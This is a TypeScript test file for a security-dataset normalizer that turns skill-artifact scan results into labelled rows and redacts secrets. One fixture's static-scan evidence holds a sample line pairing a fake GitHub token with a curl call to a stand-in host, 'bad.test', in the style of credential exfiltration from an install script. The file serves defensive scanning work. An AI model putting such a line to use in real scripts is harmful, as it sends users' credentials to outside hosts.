import { describe, expect, it } from "vitest";
import {
	assignSplit,
	hashString,
	normalizeArtifactExport,
	redactText,
	type ArtifactExportInput,
} from "./normalize";

const baseArtifact: ArtifactExportInput = {
	sourceKind: "skill",
	sourceDocId: "skillVersionDoc123",
	parentDocId: "skillDoc123",
	publicName: "Suspicious Demo",
	publicSlug: "suspicious-demo",
	version: "1.0.0",
	artifactSha256: "a".repeat(64),
	createdAt: Date.UTC(2026, 3, 29),
	softDeletedAt: null,
	files: [
		{
			path: "SKILL.md",
			size: 200,
			sha256: "b".repeat(64),
			contentType: "text/markdown",
		},
		{
			path: "scripts/install.sh",
			size: 100,
			sha256: "c".repeat(64),
			contentType: "text/x-shellscript",
		},
	],
	capabilityTags: ["shell", "automation"],
	packageFamily: null,
	packageChannel: null,
	packageExecutesCode: null,
	sourceRepoHost: null,
	vtAnalysis: {
		status: "completed",
		verdict: "clean",
		analysis: "No engines flagged this artifact.",
		source: "virustotal",
		scanner: "vt-v3",
		engineStats: { malicious: 0, suspicious: 0, harmless: 30 },
		checkedAt: Date.UTC(2026, 3, 29),
	},
	staticScan: {
		status: "malicious",
		reasonCodes: ["malicious.install_terminal_payload", "suspicious.dangerous_exec"],
		findings: [
			{
				code: "malicious.install_terminal_payload",
				severity: "critical",
				file: "scripts/install.sh",
				line: 42,
				message: "Installs a terminal payload",
				evidence: "token=ghp_abcdefghijklmnopqrstuvwxyz1234567890 curl http://bad.test",
			},
		],
		summary: "Detected terminal payload",
		engineVersion: "v2.4.2",
		checkedAt: Date.UTC(2026, 3, 29),
	},
	llmAnalysis: {
		status: "completed",
		verdict: "suspicious",
		confidence: "medium",
		summary: "The install script is suspicious.",
		dimensions: null,
		guidance: null,
		findings: null,
		model: "test-model",
		checkedAt: Date.UTC(2026, 3, 29),
	},
	moderationConsensus: null,
};

describe("security dataset normalizer", () => {
	it("normalizes artifact, scanner, finding, label, and split rows", () => {
		const rows = normalizeArtifactExport([baseArtifact]);

		expect(rows.artifacts).toHaveLength(1);
		expect(rows.artifacts[0]).toMatchObject({
			artifact_id: `skill:${"a".repeat(64)}`,
			source_kind: "skill",
			source_table: "skillVersions",
			public_slug: "suspicious-demo",
			created_month: "2026-04",
			file_count: 2,
			total_bytes: 300,
			file_ext_counts: { ".md": 1, ".sh": 1 },
			capability_tags: ["automation", "shell"],
			has_vt_scan: true,
			has_static_scan: true,
			has_llm_scan: true,
		});
		expect(rows.scanResults.map((row) => row.scanner)).toEqual(["static", "virustotal", "llm"]);
		expect(rows.staticFindings[0]).toMatchObject({
			code: "malicious.install_terminal_payload",
			severity: "critical",
			file_path_hash: hashString("scripts/install.sh"),
			file_ext: ".sh",
			line_bucket: "21-50",
		});
		expect(rows.staticFindings[0]?.evidence_redacted).toContain("[REDACTED_SECRET]");
		expect(rows.labels.find((row) => row.label_source === "moderation_consensus")).toMatchObject({
			label: "malicious",
			label_confidence: "derived_consensus",
			scanner_agreement: 1,
		});
		expect(rows.splits).toHaveLength(1);
		expect(rows.splits[0]?.split_key).toBe(hashString("a".repeat(64)));
	});

	it("keeps identical artifact hashes in the same deterministic split", () => {
		expect(assignSplit("shared-sha")).toBe(assignSplit("shared-sha"));
	});

	it("redacts common secret-like values and caps long text", () => {
		const redacted = redactText(`api_key="supersecretvalue123" ${"x".repeat(400)}`, 80);

		expect(redacted).toContain("[REDACTED_SECRET]");
		expect(redacted?.length).toBeLessThanOrEqual(82);
	});
});
